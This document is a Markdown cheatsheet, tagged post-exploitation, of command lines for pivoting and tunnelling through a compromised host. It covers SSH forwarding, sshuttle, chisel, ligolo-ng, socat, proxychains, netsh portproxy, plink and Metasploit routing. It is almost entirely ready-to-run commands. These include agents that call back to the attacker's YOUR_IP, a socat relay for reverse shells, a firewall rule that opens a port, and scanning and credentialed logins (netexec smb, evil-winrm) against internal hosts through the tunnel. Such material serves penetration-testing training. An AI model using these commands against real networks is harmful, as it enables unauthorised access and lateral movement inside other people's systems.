---
title: "Pivoting and Tunnelling Cheatsheet"
category: misc
subcategory: pivoting
type: cheatsheet
tags: [pivoting, ssh, chisel, socat, proxychains, ligolo-ng, sshuttle, port-forwarding, socks-proxy, netsh, tunnelling, post-exploitation]
summary: "SSH -L/-R/-D, chisel, ligolo-ng, socat, sshuttle, proxychains and Windows portproxy command lines for pivoting through a compromised host."
related: [net-pivoting-tunnelling, net-reverse-shell-cheatsheet, ad-cheatsheet]
---

## SSH forwarding

```bash
# LOCAL: your:8080 -> internal:80 (via pivot)
ssh -L 8080:10.10.20.7:80 user@10.10.10.5
# LOCAL bind to all interfaces
ssh -L 0.0.0.0:8080:10.10.20.7:80 user@10.10.10.5
# REMOTE: expose your local :9001 on the pivot
ssh -R 9001:127.0.0.1:9001 user@10.10.10.5
# REMOTE bind to all pivot interfaces (needs GatewayPorts yes)
ssh -R 0.0.0.0:9001:127.0.0.1:9001 user@10.10.10.5
# DYNAMIC SOCKS proxy on :1080
ssh -D 1080 user@10.10.10.5
# background, no shell (typical combo)
ssh -f -N -D 1080 user@10.10.10.5
# ProxyJump chain
ssh -J user@10.10.10.5 admin@10.10.20.7
# multi-hop ProxyJump
ssh -J user@10.10.10.5,user@10.10.20.7 admin@10.10.30.9
# reuse a control master (faster repeated hops)
ssh -M -S /tmp/ctl -fN user@10.10.10.5
```

## sshuttle

```bash
# Route a subnet over SSH (VPN-like, no proxychains)
sshuttle -r user@10.10.10.5 10.10.20.0/24
# Multiple subnets, exclude the SSH host
sshuttle -r user@10.10.10.5 10.10.20.0/24 172.16.0.0/16 -x 10.10.10.5
# With a key and verbose
sshuttle -r user@10.10.10.5 --ssh-cmd 'ssh -i key' 10.10.20.0/24 -v
```

## chisel

```bash
# YOUR box: reverse server
./chisel server --reverse --port 8000
# PIVOT: reverse SOCKS on your :1080
./chisel client YOUR_IP:8000 R:1080:socks
# PIVOT: reverse single-port (your:3306 -> internal:3306)
./chisel client YOUR_IP:8000 R:3306:10.10.20.7:3306
# forward mode (you connect to chisel server on the pivot)
./chisel client 10.10.10.5:8000 1080:socks
# with auth and keepalive
./chisel server --reverse --port 8000 --auth user:pass
./chisel client --auth user:pass --keepalive 20s YOUR_IP:8000 R:1080:socks
```

## ligolo-ng

```bash
# YOUR box: proxy with self-signed cert
./proxy -selfcert -laddr 0.0.0.0:11601
# one-time tun interface setup
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
# PIVOT: agent connects back
./agent -connect YOUR_IP:11601 -ignore-cert
# in the proxy console: select session, then view its networks
#   session
#   ifconfig
# YOUR box: route the internal subnet through the tun
sudo ip route add 10.10.20.0/24 dev ligolo
# proxy console: start the tunnel
#   start
# expose a local listener to the agent (for reverse shells from internal hosts)
#   listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

## socat

```bash
# TCP port forwarder on the pivot: pivot:8080 -> internal:80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.7:80
# relay a reverse shell through the pivot
socat TCP-LISTEN:9001,fork TCP:YOUR_IP:9001
# encrypted relay
socat OPENSSL-LISTEN:8443,cert=cert.pem,verify=0,fork TCP:10.10.20.7:80
# UDP forward
socat UDP-LISTEN:161,fork UDP:10.10.20.7:161
```

## proxychains

```bash
# /etc/proxychains4.conf : mode + proxy
#   dynamic_chain            (skip dead proxies)
#   [ProxyList]
#   socks5 127.0.0.1 1080
# run tools through the tunnel
proxychains -q nmap -sT -Pn -n -p 22,80,445 10.10.20.7
proxychains -q netexec smb 10.10.20.0/24 -u u -p p
proxychains -q curl http://10.10.20.7/
proxychains -q evil-winrm -i 10.10.20.7 -u admin -p pass
# disable proxy_dns (comment it) if DNS hangs
```

## Windows pivots

```cmd
:: netsh portproxy: pivot:8080 -> internal:80 (admin)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.20.7
:: show rules
netsh interface portproxy show all
:: delete rule
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
:: open the firewall port
netsh advfirewall firewall add rule name=fwd dir=in action=allow protocol=TCP localport=8080
```

```bash
# plink reverse forward from a Windows pivot
plink.exe -ssh -R 3306:10.10.20.7:3306 user@YOUR_IP -pw password
# powershell native port forward (New-NetFirewallRule + netsh above), or:
# use ligolo/chisel agents (single static binary) instead
```

## Metasploit pivot

```
# add a route via a meterpreter session
run autoroute -s 10.10.20.0/24
# start a SOCKS5 proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run
# port forward from within meterpreter
portfwd add -l 3306 -p 3306 -r 10.10.20.7
```

## Enumerate from a foothold (find the next hop)

```bash
# interfaces / routes
ip a; ip route; arp -a
# windows
ipconfig /all & route print & arp -a
# quick sweep of the new subnet through the tunnel
proxychains -q nmap -sT -Pn -n --top-ports 50 10.10.20.0/24
```

## Reminders

```text
# -L pulls a remote service to your local port; -R pushes your local service to the remote side.
# SOCKS carries TCP only -- use ligolo/sshuttle for UDP (DNS, SNMP).
# nmap over proxychains MUST be -sT -Pn (no SYN/UDP/OS detection).
# match chisel/ligolo/socat architecture (amd64/arm) to the pivot; use static builds.
```
